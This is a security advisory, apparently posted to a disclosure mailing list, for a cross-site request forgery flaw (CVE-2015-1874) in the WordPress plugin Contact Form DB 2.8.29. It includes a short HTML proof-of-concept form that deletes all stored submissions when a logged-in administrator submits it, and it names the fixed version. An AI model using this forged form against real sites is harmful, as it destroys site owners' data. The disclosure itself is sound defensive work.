Subject: [FD] CSRF in Contact Form DB allows attacker to delete all stored
	form submissions (WordPress plugin)

Details
================
Software: Contact Form DB
Version: 2.8.29
Homepage: https://wordpress.org/plugins/contact-form-7-to-database-extension/
Advisory report: https://security.dxw.com/advisories/csrf-in-contact-form-db-allows-attacker-to-delete-all-stored-form-submissions/
CVE: CVE-2015-1874
CVSS: 4.3 (Medium; AV:N/AC:M/Au:N/C:N/I:P/A:N)

Description
================
CSRF in Contact Form DB allows attacker to delete all stored form submissions

Vulnerability
================
An attacker able to convince a logged in admin user to follow a link (for instance via spearphishing) will be able to cause all records stored by this plugin to be removed.

Proof of concept
================
If a logged-in administrator user clicks the submit button on this form, all records stored by the plugin will be deleted (in a real attack the form can be made to auto-submit using Javascript).
<form action=\"http://localhost/wp-admin/admin.php?page=CF7DBPluginSubmissions\" method=\"post\">
  <input name=\"all\" type=\"text\" value=\"y\">
  <input name=\"delete\" type=\"text\" value=\"y\">
  <input type=\"submit\">
</form>

Mitigations
================
Upgrade to version 2.8.32 or later
